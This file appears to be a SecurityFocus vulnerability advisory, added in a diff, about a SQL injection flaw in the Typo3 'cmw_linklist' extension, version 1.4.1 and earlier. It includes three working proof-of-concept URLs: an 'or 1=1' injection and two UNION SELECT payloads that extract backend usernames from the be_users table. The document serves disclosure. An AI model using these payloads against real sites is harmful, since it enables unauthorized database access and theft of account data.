@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/12721/info
+
+Typo3 'cmw_linklist' extension is affected by a remote SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in a SQL query.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+This issue is reported to affect 'cmw_linklist' extension versions 1.4.1 and earlier. 
+
+http://www.example.com/[LinksSection]?&no_cache=1&action=getviewcategory&category_uid=1%20or%201=1
+
+Gulftech Security Research has supplied the following additional proof of concepts:
+A test for vulnerability:
+http://www.example.com/[path]/?&action=getviewcategory&category_uid=-99%20UNION%20SELECT%20username%20FROM%20be_users%20WHERE%20uid=1/*
+Lists user names and categories:
+http://www.example.com/[path]/?&action=getviewcategory&category_uid=-99%20UNION%20SELECT%20username,null%20FROM%20be_users%20WHERE%201/* 
